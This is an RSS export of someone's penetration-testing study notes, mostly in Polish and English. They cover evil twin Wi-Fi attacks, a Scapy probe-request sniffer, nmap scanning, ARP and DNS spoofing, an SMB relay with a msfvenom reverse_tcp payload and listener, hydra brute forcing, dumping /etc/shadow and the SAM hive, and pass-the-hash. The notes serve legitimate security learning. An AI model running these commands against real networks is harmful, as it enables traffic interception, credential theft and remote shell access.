<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Fri, 12 Aug 2022 09:41:34 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[Evil Twin attack]]></title>
            <guid>7c327f19ec204e128cf9754de4154eec</guid>
            <pubDate>Thu, 11 Aug 2022 09:57:41 GMT</pubDate>
            <content:encoded><![CDATA[<div><pre class="hljs"><code><span class="hljs-variable">$ </span>airodump-ng wlan0mon	 <span class="hljs-comment"># dump pakietów z ze skonfigurowanego wcześniej interfejsu</span>
<span class="hljs-comment"># Identify a legitimate access point.</span>
<span class="hljs-comment"># \/ tworz nowy tap interfejs at0 używany do otrzymywania odszyfrowanych pakietów i wysyłania zaszyfrowanych</span>
<span class="hljs-comment"># tworzy fejkowy AP o nazwie jak prawdziwy i pracujący na tym samym kanale ale mający inny BSSID,</span>
<span class="hljs-comment"># prawdziwy AP jest zazwyczaj chroniony hasłem, fałszywy jest bez hasła </span>
<span class="hljs-variable">$ </span>airbase-ng -e Moomin -c <span class="hljs-number">1</span> wlan0mon <span class="hljs-comment"># Clone the access point.</span>
<span class="hljs-comment"># -e -nazwa tworzonego punktu (ESSID)</span>
<span class="hljs-comment"># -c -kanał wifi</span>
<span class="hljs-comment"># wlan0mon -ustaw replay interface jako wlan0mon</span>
<span class="hljs-variable">$ </span>ifconfig at0 up <span class="hljs-comment"># podnosi interfejs</span>
<span class="hljs-variable">$ </span>ifconfig at0 <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> <span class="hljs-comment"># ustaw IP i maskę dla portu</span>
<span class="hljs-variable">$ </span>route add –net <span class="hljs-number">192.168</span>.<span class="hljs-number">2.0</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> gw <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> <span class="hljs-comment"># statyczny routing, ruch z połączonych klientów będzie forwardowany do prawdziwego gateway</span>
<span class="hljs-variable">$ </span>iptables –P FORWARD ACCEPT <span class="hljs-comment"># iptables to create a policy that accepts forwarding in the chain target. This makes our attacking machine act like a router, even though it isn't. </span>
<span class="hljs-variable">$ </span>iptables –t nat –A POSTROUTING –o wlan0mon –j MASQUERADE <span class="hljs-comment"># route outbound traffic without disrupting the normal flow of traffic on the network, MASQUERADE option acts like a source NAT</span>
<span class="hljs-variable">$ </span>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/sys</span><span class="hljs-regexp">/net/ipv</span>4/ip_forward <span class="hljs-comment"># enable IP forwarding by setting the flag to 1</span>
<span class="hljs-variable">$ </span>iwconfig wlan0mon txpower <span class="hljs-number">27</span> <span class="hljs-comment"># adapters that support it, we can increase the power of the evil twin by changing the signal strength using the txpower option with iwconfig. (27 dB or 500 mW,legal limit in the U.S.)</span>
<span class="hljs-variable">$ </span>aireplay-ng –deauth <span class="hljs-number">50</span> –a <span class="hljs-symbol">C8:</span><span class="hljs-number">91</span><span class="hljs-symbol">:F9</span><span class="hljs-symbol">:A2</span><span class="hljs-symbol">:</span><span class="hljs-number">83</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span> wlan0mon <span class="hljs-comment"># Conduct a de-authentication attack, kick wireless clients off the legitimate access point </span>
<span class="hljs-comment"># ‑deauth 50 -send fifty 802.11 deauthentication frames to the Moomin network</span></code></pre></div>
<p>One common tactic that follows on from an evil twin attack is to present the user with a captive portal. A captive portal is a web page to which a client is redirected when they connect to a guest SSID. The client can gain access to the internet after they successfully authenticate or accept the terms of use on the portal page. Captive portals will be familiar to anyone that uses Wi‑Fi offered in public places, including hotels, transport hubs, and coffee shops. If we can trick the user into thinking that they need to reauthenticate after momentarily being disconnected from the network, we can capture those credentials and use them to gain access to the target network.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SCAPY]]></title>
            <guid>b5cb3c748c87484fb647960f830df717</guid>
            <pubDate>Thu, 11 Aug 2022 09:24:50 GMT</pubDate>
            <content:encoded><![CDATA[<p><strong>Scapy</strong> is a Python library and standalone program that enables users to send, sniff, dissect, and forge network packets. It can be installed using pip or the relevant package manager for your platform. We can scan, traceroute, probe, attack, and discover networks using Scapy. Imagine replacing hping, arpspoof, arping, tcpdump, tshark, p0f, and most of nmap with just one program.</p>
<p>Build own tool to identify another user’s known Wi‑Fi networks by detecting probe requests to search for and find any of the wireless networks in list of preferred networks that contains the names of wireless networks the device has connected to in the past.</p>
<div><pre class="hljs"><code><span class="hljs-comment"># put card in monitor mode</span>
$ airmon-ng<span class="hljs-built_in"> check </span>kill
$ airmon-ng start wlan0
<span class="hljs-comment"># tworzę skrypt w pythonie do sniffowania pakietów sniff_probe_request.py</span>
from scapy.all import *
interface=<span class="hljs-string">"wlan0mon"</span>
probeRequests=[]

def probeSniff(pkt):
   <span class="hljs-built_in"> if </span>pkt.haslayer(Dot11ProbeReq):
        networkName=pkt.getlayer(Dot11ProbeReq).info
       <span class="hljs-built_in"> if </span>networkName<span class="hljs-built_in"> not </span>in probeRequests:
            probeRequests.append(networkName)
            print(f<span class="hljs-string">"New probe request: {str(networkName)}"</span>)

sniff(iface=interface,prn=probeSniff)</code></pre></div>
<p>We begin by identifying our wireless network interface card and putting it into monitor mode with airmon. Next, we install Scapy using apt, but it can be installed using pip. We now create a Python script file called sniff_probe_requests.py and import the Scapy library. The variable interface holds the name of our wireless interface that is now in monitor mode, and we create an empty list of probeRequests. Let’s now create a function that sniffs packets on the wireless networks and which tries to identify probeRequests. The function receives a packet, pkt. We then dissect the packet to identify if it has a .11 probeRequests layer with the haslayer method. If the packet is a probe request, then we extract the network name from the info property of the packet’s getlayer method. There’s no point in recording this probe request if we’ve already seen it, so first we check to see if it’s in the probeRequests list, and if not, we append it to the list. Having detected a new probe request and added it to our list, we print the requested network named to screen. Finally we use Scapy’s sniff function, passing it the name of our wireless monitoring interface and the destination for any detected packets, which is our probeSniff function. Let’s run our script and see what we get. Since we rely on devices that have either been rebooted or disconnected from a Wi‑Fi network, it may take some time to see results. But imagine sitting in a public space where passersby have disconnected from their home or work networks, and their phones or laptops are actively seeking a known network to connect to. In the face of it, this seems harmless, but this is a massive breach of confidentiality. With a few lines of code, you may be able to identify where someone works, where they shop, where they socialize, which major transport hubs they use, the hotels they’ve stayed at, and more. This information could be invaluable for a subsequent social engineering attack.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Overall Pentesting Process]]></title>
            <guid>6afec035aa664c6f9683d26125a0f393</guid>
            <pubDate>Wed, 10 Aug 2022 05:09:01 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="1-planning-and-scoping">1. Planning and Scoping</h1>
<ol>
<li>Initial information gathering
Understand the magnitude of the pentest
<ul>
<li>How many IPs will be tested?</li>
<li>How many assets?</li>
<li>How many URLs? How many pages per URL?
Understand the detection capabilities</li>
<li>Are there any WAF or next gen firewall?</li>
</ul>
</li>
<li>Create, review and sign agreements</li>
<li>Refine assets in scope</li>
<li>Define attacks and methodologies</li>
<li>Define rules of engagement</li>
</ol>
<p><strong>Types of penetration testing</strong>
Internal, external, web application, IoT, mobile, etc.
Black-box vs. grey-box vs white-box
<strong>Main Pentest Methodologies and Frameworks</strong> (The overall pentest process)</p>
<ul>
<li>PTES <a title="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines" href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
<li>OWASP, mainly focused on Web Applications,  <a title="https://owasp.org/" href="https://owasp.org/">https://owasp.org/</a></li>
<li>MITRE ATT&amp;CK, framework for adversary emulation</li>
<li>NIST, non-regulatory agency of the US</li>
<li>OSSTMM, in-depth description of each step of a penetration testing</li>
<li>ISSAF, covers some of the most common attacks and tools. With a lot of practical examples</li>
</ul>
<p><strong>Most Common Compliance Standards</strong> (normy bezpieczeństwa)</p>
<ul>
<li>PCI-DSS</li>
<li>GDPR</li>
<li>HIPAA</li>
<li>SOX</li>
<li>NERC-CIP</li>
<li>ISO27001</li>
</ul>
<p><strong>The Importance of Paperwork</strong>
<em>Non-Disclosure Agreements (NDAs):</em> Ensure that the information discussed during the pentest will not be released to anyone outside of the project, hefty fines for breaking confidentiality rules
Also known as: Confidentiality Agreement (CA), Confidential Disclosure Agreement (CDA), Proprietary Information Agreement (PIA)
<em>Master Service Agreements (MSA)</em> Includes terms such as: how invoices will be sent, how payments will be made, ownership of intellectual properties, etc.
<em>Statement of Work (SOW)</em> Documents the details of a specific project, one SOW per pentest engagement, define things such as: assets in scope, project deliverables, price for the services, etc. You can have multiple SOWs for a client while having just one MSA
<em>Permission to Attack</em> Also known as “Get-Out-of-Jail-Free” cards, a document authorizing you to perform the attacks, Describe the attacks and dates of the tests, signed by a high-level executive in the client, includes their contact information, it is what differentiates you from a criminal</p>
<h1 id="2-information-gathering">2. Information Gathering</h1>
<p><strong>Main relevant information</strong>: Names, titles, email addresses, LinkedIn profiles, identity, public documents, etc.</p>
<h2 id="open-source-intelligence-osint">Open Source Intelligence (OSINT):</h2>
<p><em>Main passive techniques</em>: Search engine enumeration, social media, job postings, etc.
<em>Main active techniques</em>: Social engineering, phishing attempts, etc.</p>
<p><strong>Main sources of data and main tools</strong>: For both passive and active techniques
<em>search engines</em> (google, bing,baidou, shodan), social media (fb, linkedin, instagram, job posting),
<em>third party databases</em> (threat intelig. platforms, data breach compilation, web archive, WHOIS, certificate db)
<em>passive info gathering tools</em>: OWASP Amass, Sn1per, Maltego, Recon-NG, theHarvester</p>
<p><strong>Searh engine enumeriation</strong></p>
<ul>
<li>google dorks, <a title="https://www.exploit-db.com/google-hacking-database" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a> (site:nasa.gov, filetype:pdf(log), allintext:user, intitle:“Index of /”)</li>
<li>shodan (search for tehnologies and services: find server with port 21 open, search for metadata)</li>
<li>password dump databases(HaveIBeenPwned, wyciek “collection #1-#5”)</li>
<li>website archives: <a title="https://web.archive.org/" href="https://web.archive.org/">https://web.archive.org/</a></li>
<li>CVE/CWE searches, public document enumeration</li>
</ul>
<hr />
<h2 id="narzędzia-passive">Narzędzia (passive)</h2>
<h3 id="theharvester">theHarvester</h3>
<p>It performs open source intelligence (OSINT) gathering to help determine a domain’s external threat landscape. The tool gathers names, emails, IPs, subdomains, and URLs by using multiple public resources
Enumerating search engines and scrapping  social media: Subdomains, hosts and IPs,  Email addresses, Twitter accounts, LinkedIn profiles</p>
<h3 id="recon-ng">Recon-ng</h3>
<p>Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
<strong>domain host enumeration</strong>
install module</p>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>marketplace search
<span class="hljs-variable">$ </span>marketplace install (nazwa co chcemy zainstalować)
<span class="hljs-variable">$ </span><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">load</span> (<span class="hljs-title">nazwa</span>)</span>
<span class="hljs-variable">$ </span>info	-informacje jak posługiwać się modułem, manual</code></pre></div>
<h3 id="sn1per">Sn1per</h3>
<h3 id="maltego">Maltego</h3>
<h3 id="spiderfoot">SpiderFoot</h3>
<h3 id="owas-amass">OWAS Amass</h3>
<p><a title="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md" href="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md">https://github.com/OWASP/Amass/blob/master/doc/user_guide.md</a></p>
<h3 id="github-elevenpathfoca">github ElevenPath/FOCA</h3>
<p>use search engines for document, extract metadata</p>
<h3 id="github-opsdiskmeatgoofil">github opsdisk/meatgoofil</h3>
<p>automate document search, githube search</p>
<h3 id="gitleaks-httpsgithubcomzricethezavgitleaks">GitLeaks -<a title="https://github.com/zricethezav/gitleaks" href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a></h3>
<p>przeszukuje repozytorium git w poszukiwaniu wrażliwych danych</p>
<h3 id="trufflehog-httpsgithubcomtrufflesecuritytrufflehog">TruffleHog- <a title="https://github.com/trufflesecurity/TruffleHog" href="https://github.com/trufflesecurity/TruffleHog">https://github.com/trufflesecurity/TruffleHog</a></h3>
<p>Find leaked credentials. git, github, gitlab, S3, filesystem, syslog, file and stdin (coming soon)</p>
<hr />
<h2 id="actively-gathering-port-and-service-information">Actively Gathering Port and Service Information</h2>
<h3 id="nmap-scripts">NMAP scripts</h3>
<div><pre class="hljs"><code><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> <span class="hljs-number">10.10.56.0</span>/<span class="hljs-number">24</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.18.10</span>-<span class="hljs-number">25</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.*.<span class="hljs-number">10</span>
<span class="hljs-attribute">nmap</span> localhost
<span class="hljs-attribute">nmap</span> -iL targets.txt</code></pre></div>
<p>znajdź wszystkie hosty z podanego zakresu mające otwarte porty p, wypróbuje każdy adres z puli, * zastąpi liczbami 0-255</p>
<div><pre class="hljs"><code><span class="hljs-comment">* -iL -read target specifications from file</span>
<span class="hljs-comment">* -F - top 100 ports</span>
<span class="hljs-comment">* -T -speed of scan (0-5)</span></code></pre></div>
<p><strong>1.  host discovery</strong> w sieci</p>
<div><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> IP
<span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>-<span class="hljs-number">254</span> **lub** <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span></code></pre></div>
<p><strong>2.  port scan</strong></p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> nmap -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP
<span class="hljs-symbol">$</span> nmap -sU -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP

<span class="hljs-comment">* -sS domyślnie skan  -niepełny 3 way handshake, stealth("nie zauważalny tak po chuju bo pakiety są puste i podejrzane, zwykły skan mniej się rzuca w oczy")</span>
<span class="hljs-comment">* -sT -skanowanie z pełnym 3 way handshake</span>
<span class="hljs-comment">* -sU skan UDP</span>
<span class="hljs-comment">* -p- -wszystkie porty</span>
<span class="hljs-comment">* --open: Only show open (or possibly open) ports</span>
<span class="hljs-comment">* --min-rate=1000 1000 pakietów na s</span>
<span class="hljs-comment">* --top-ports 20 -20 najczęstrzych portów</span></code></pre></div>
<p><strong>2. Dalsze skanowanie portów</strong></p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> nmap -p {wcześniej znalezione porty} IP -vv -sC -sV

<span class="hljs-comment">* -vv verbose- więcej "v", więcej opisu</span>
<span class="hljs-comment">* -sC - --script=default</span>
<span class="hljs-comment">* -sV -service version</span>
<span class="hljs-comment">* -O -OS detection</span>
<span class="hljs-comment">* -oN/-oX/-oS/-oG/-oA &lt;file&gt; -wynik skanowania zapisany w foramtach normal, XML, s|rIpt kIddi3, grepable format, w 3 pierwszych foramtach na raz i nazwa pliku</span>
<span class="hljs-comment">* --script=  *(folder ze skryptami /usr/share/nmap/scripts)</span>
    - vuln
    - smb-enum-shares (enumerate smb shares)
    - smb-vuln-ms<span class="hljs-number">-010</span> - czy serwer jest wrażliwy <span class="hljs-literal">na</span> podatność Eternal Blue 
    - ftp-anon (FTP anonymous login)
    - http-title
<span class="hljs-comment">* --open</span>
<span class="hljs-comment">* -A -agresive</span></code></pre></div>
<h3 id="openvas-green-bone">OpenVAS (Green Bone)</h3>
<p><a title="https://www.greenbone.net/en/" href="https://www.greenbone.net/en/">https://www.greenbone.net/en/</a></p>
<h3 id="wpscan">WPScan</h3>
<p>Word press skaner
można dostać aklucz API ze strony <a title="https://wpscan.com/wordpress-security-scanner" href="https://wpscan.com/wordpress-security-scanner">https://wpscan.com/wordpress-security-scanner</a> i używać automatu połączonego z chmurą WPScan</p>
<div><pre class="hljs"><code>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.2.49</span> <span class="hljs-params">--api-token</span> {token}
* <span class="hljs-params">--url</span> -adres
</code></pre></div>
<h3 id="metasploit">Metasploit</h3>
<h3 id="sqlmap">SQLMap</h3>
<h3 id="owaspzap">OWASPZap</h3>
<h3 id="burp-suite">Burp Suite</h3>
<h3 id="nexpose-community">Nexpose Community</h3>
<p><strong>Website scraping and crawling</strong></p>
<h3 id="set-tolkit">SET Tolkit</h3>
<p><a title="https://github.com/trustedsec/social-engineer-toolkit" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a>
The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has a number of custom attack vectors that allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC – an information security consulting firm located in Cleveland, Ohio.</p>
<h3 id="eyewitness">EyeWitness</h3>
<h3 id="dirb">Dirb</h3>
<p>Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
enumeruje podstrony metodą bruteforce</p>
<h3 id="nikto">Nikto</h3>
<h3 id="commercial-tools">Commercial Tools</h3>
<p>xQualys, Nessus, Rapid7 Nexpose, Tenable,  F-Secure Radar, Tripwire IP360,  Burp Suite Pro, Metasploit Pro, etc.</p>
<h1 id="3-vulnerability-analysis">3. Vulnerability Analysis</h1>
<h1 id="4-exploitation">4. Exploitation</h1>
<h2 id="attack-against">Attack against</h2>
<p>Confidentiality,
Integrity (exploit trust existing betwen two entities): Data diddling, Salami attacks, Phishing
Availability (dostępność usług): DOS, DDOS, jamming, de-authentication attack, Telephone jamming, Power cut, Environment attacks</p>
<h2 id="attack-and-exploit-resources">Attack and Exploit Resources</h2>
<p>Mitre Att&amp;ck <a title="https://attack.mitre.org" href="https://attack.mitre.org">https://attack.mitre.org</a>
Attack and Exploit Resources CISA <a title="https://www.cisa.gov" href="https://www.cisa.gov">https://www.cisa.gov</a>
Microsoft <a title="https://docs.microsoft.com/en-us/security-updates" href="https://docs.microsoft.com/en-us/security-updates">https://docs.microsoft.com/en-us/security-updates</a>
Packet Storm Security <a title="https://packetstormsecurity.com" href="https://packetstormsecurity.com">https://packetstormsecurity.com</a>
Exploit Database <a title="https://www.exploit-db.com" href="https://www.exploit-db.com">https://www.exploit-db.com</a></p>
<h2 id="network-attacks">Network attacks</h2>
<h3 id="arp-spoofing">ARP spoofing</h3>
<p>ARP- link mac addres of interfacewith IP addres,
działanie: broadcast Who has 192.168.2.11, jeden host odpowiada i podaje swój MAC. ARP Spoofing- podszywanie się atakująćego pod Default Gateway<br />
<strong>arpspoof</strong> - najpopularniejsze, przekierowuje pakiety w sieci fałszując odpowiedzi w ARP
inne: Ettercap, Arpison, Cain and Abel
najpierw trzeba włączyć ip forwarding</p>
<div><pre class="hljs"><code>$ echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward </code></pre></div>
<p>oszukiwanie hosta, podszywnaie się pod default gateway</p>
<div><pre class="hljs"><code>$ arpspoof -i eth0 -t <span class="hljs-number">192.168.2.10</span> <span class="hljs-number">192.168.2.1</span> -r</code></pre></div>
<p>oszukiwanie default gateway, podszywnaie się pod hosta</p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> arpspoof -i eth0 -t <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.10</span> -r 
<span class="hljs-comment">* -i eth0 -mój interfejs podłączony do atakowanej sieci</span>
<span class="hljs-comment">* -t 192.168.2.10 -TARGET, host do którego wysyłane są oszukane pakiety, jeśli nie podany to zatruwa wszystkie hosty w sieci</span>
<span class="hljs-comment">* 192.168.2.1 -host pod którego się podszywamy (default gateway) </span>
<span class="hljs-comment">* -r -przechwytywanie ruchu w obu kierunkach</span></code></pre></div>
<h3 id="mac-spoofing">MAC spoofing</h3>
<p>Why:
protect privacy- device tracking (static MAC)
gain free acces to service
gain unauthorised acces to a network (MAC filtering na urządzeniach, np WiFi)
<strong>programy</strong>: Technitium MAC, NoVirus Thanks MAC, Smart MAC, SMAC MAC, Spoof-Me-Now
z terminala:</p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> ifconfig eth0 down  			-położenie interfejsu
<span class="hljs-symbol">$</span> ifconfig hw ether <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> 	-zmiana MAC <span class="hljs-literal">na</span> wybrany
<span class="hljs-symbol">$</span> ifconfig eth0 up			-podniesienie interfejsu</code></pre></div>
<h3 id="switch-spoofing">Switch spoofing</h3>
<p>VLAN hopping attack
DTP (Dynamic Trunking Protocol)- automatyczne tworzneie łącz typu Trunk między switchami (CISCO chyba tylko), jeśli switch jest źle skonfigurowany (port w trybie Dynamic desirable, Dynamic auto, Trunk) to można stworzyć łącze Trunk między switchem, a podłączonym atakującym hostem udająć switch. Obrona to wyłączenie protokołów w switchu lub zmiana na <em>switchport mode acces</em>
<strong>progrmay</strong>: Yersinia- layer 2 attacks (przeciwko protokołom DTP, VTP, ISL)</p>
<h3 id="replay-and-relay-attacks">Replay and relay attacks</h3>
<p><strong>programy</strong>: Metasploit, Responder, Inveigh,</p>
<h4 id="smb-relay-attack">SMB Relay Attack</h4>
<p>Admin chce połączyć się z bazą danych, atakujący staje między i zahowuje się jak proxy dla admina i bazy, przekazuje pakiety między nimi, admin przekazuje credsy admina i przekazuje je jako swoje</p>
<div><pre class="hljs"><code><span class="hljs-comment"># tworzenie payloda dla bazy danych, który spowoduje nawiązanie sesji revese TCP</span>
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 <span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -f exe &gt; smb_rev.exe
-p -payload  
-a -target arhitecture
<span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -adres i<span class="hljs-built_in"> port </span>atakującej maszyny dla reverse TCP, mój adres i<span class="hljs-built_in"> port
</span>-f -msfvenom ma stworzyć windows executable
smb_rev.exe -nazwa stworzonego payloadu</code></pre></div>
<div><pre class="hljs"><code># tworzenie listenera dla połączenia zwrotnego nawiązywanego przez payload
<span class="hljs-symbol">$</span> msfconsole
<span class="hljs-symbol">$</span> use exploit/multi/handler
<span class="hljs-symbol">$</span> <span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
$ <span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.2.121</span>
$ <span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4321</span>
$ run</code></pre></div>
<p>Włączanie ataku SMB Realay Attack</p>
<div><pre class="hljs"><code>$ <span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span>
-h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -target, baza danych
-<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span> -uruchom binarkę smb_rev.<span class="hljs-keyword">exe</span></code></pre></div>
<p>po uruchomieniu program czeka na próbę autentykacji między adminem, a serwerem, wyożystuje ją, metasploit przechwytuje połączenie i daje reverse shell do serwera SMB</p>
<h3 id="dns-spoofing">DNS spoofing</h3>
<p>Windows: klienci łączący sie  z usługami MS Service wykorzystają NetBIOS resolution), Hostname resolution przy połączeniu TCP/IP nie do zasobów MS
MS Host name reolution order:</p>
<ol>
<li>Is it me?</li>
<li>Local host file C:\Windows\System32\drivers\etc (owner Admin)</li>
<li>Query Domain Name Service</li>
<li>Multicast query (czy ktoś inny zna adres IP domeny z którą chcę się połączyć)</li>
</ol>
<p><strong>programy</strong>: <strong>dnsspoof</strong>, Ettercap, Bettercap
Przykład:
Default Gateway: 192.168.2.1
Victim: 192.168.2.10
Fake Website: 192.168.2.20</p>
<ol>
<li>Utworzenie fałszywej strony</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /tmp
<span class="hljs-variable">$</span> <span class="hljs-built_in">cp</span> ~/my_fake_websites/index.html .
<span class="hljs-variable">$</span> python3 <span class="hljs-literal">-m</span> http.server</code></pre></div>
<ol start="2">
<li>ARP spoofing, podszywanie się pod DG</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/sys</span><span class="hljs-regexp">/net/ipv</span>4/ip_forward 
<span class="hljs-variable">$ </span>arpspoof -i eth0 -t <span class="hljs-number">192.168</span>.<span class="hljs-number">2.10</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span>
<span class="hljs-variable">$ </span>arpspoof -i eth0 -t <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.10</span></code></pre></div>
<ol start="3">
<li>Stworzenie pliku z fałszywym wpisem DNS</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> 192.168.2.20 www.globomantics.com&gt; poisoned_hosts.txt</span></code></pre></div>
<ol start="4">
<li>Zatrucie DNS</li>
</ol>
<div><pre class="hljs"><code>$ dnsspoof -<span class="hljs-selector-tag">i</span> eth0 -f poisoned_hosts<span class="hljs-selector-class">.txt</span>
-<span class="hljs-selector-tag">i</span> eth0 -interfejs z któ¶ego nadaję
-f poisoned_hosts<span class="hljs-selector-class">.txt</span> -plik ze spreparowanym wpisem DNS</code></pre></div>
<ol start="5">
<li>Sprawdzenie czy atak zadziałał, nazwa <em>www.globomantics.com</em> powinna prowadzić do <em>192.168.2.20</em></li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>nslookup www.globomantics.com</code></pre></div>
<h2 id="password-attacks">Password attacks</h2>
<h3 id="account-lockout">Account Lockout</h3>
<p>zablokowanie konta poprzez wielokrotne podanie złego hasła- password guessing
czy accout lockout jest włączone</p>
<div><pre class="hljs"><code>&gt; net accounts (Windows)
$ <span class="hljs-keyword">grep</span> tally <span class="hljs-regexp">/etc/</span>pam.conf (Linux)
lub <span class="hljs-regexp">/etc/</span>pam.d</code></pre></div>
<p>Jeśli jest włączone to przetestować: próbować zalogować się wielokrotnie błędnie, w krótkim czasie, sprawdzić czy lockout zadziałał i nie można się zalogować (credsy dostać od admina)
<strong>Password guessing</strong> with <strong>THC hydra</strong>: brute force attack przeciwko serwerowi ssh, każda możliwa kombinacja z user i password</p>
<div><pre class="hljs"><code>hydra -L users.txt -P passwords.txt -t <span class="hljs-number">6</span> ssh:<span class="hljs-comment">//192.168.2.20 -u</span>
<span class="hljs-comment">* -L -plik tekstowy z loginami</span>
<span class="hljs-comment">* -P -plik tekstowy z hasłami</span>
<span class="hljs-comment">* -t6 -threads/wątki</span>
<span class="hljs-comment">* -u -password spraying (dla każdego hasła po kolei użytkownik, domyślnie to na użytkownika każde hasło i następny użytkownik)</span></code></pre></div>
<p><strong>Dictionary Attacks</strong> ??? (znaleźć program któ¶y na podstawie danych o osobie wytworzy słownik )
<strong>Obtaining Linux password representation</strong></p>
<div><pre class="hljs"><code><span class="hljs-regexp">/etc/</span>passwd
<span class="hljs-regexp">/etc/</span>shadow</code></pre></div>
<div><pre class="hljs"><code>$ unshadow <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-regexp">/etc/</span>shadow &gt; crack.passwd.db -odszyfruj hasła linux <span class="hljs-keyword">do</span> pliku</code></pre></div>
<p><strong>Obtaining Windows password representation</strong> (roziwnąć się kiedyś w tym)<br />
Registry Hives: SAM  (Security Account Manager), system, Security; Memory;Windows Credential Manager; Active Directory database; Network Service accounts;</p>
<div><pre class="hljs"><code>&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\security c:\temp\sam.<span class="hljs-keyword">save</span></code></pre></div>
<h3 id="pass-the-hash">Pass-the-hash</h3>
<p>nie uwieżytelnianie się hasłem tylko wysyłanie juz hasha hasła</p>
<div><pre class="hljs"><code>msf6 &gt; use exploit/windows/smb/psexec
msf6 &gt; <span class="hljs-built_in">set</span> RHOST 192.168.2.11
msf6 &gt; <span class="hljs-built_in">set</span> SMBUser Bob
msf6 &gt; <span class="hljs-built_in">set</span> SMBPass ASDaDSFsDGasfvaeRbAEFVAsFVa<span class="hljs-built_in">..</span>. (users hash)
msf6 &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
msf6 &gt; run</code></pre></div>
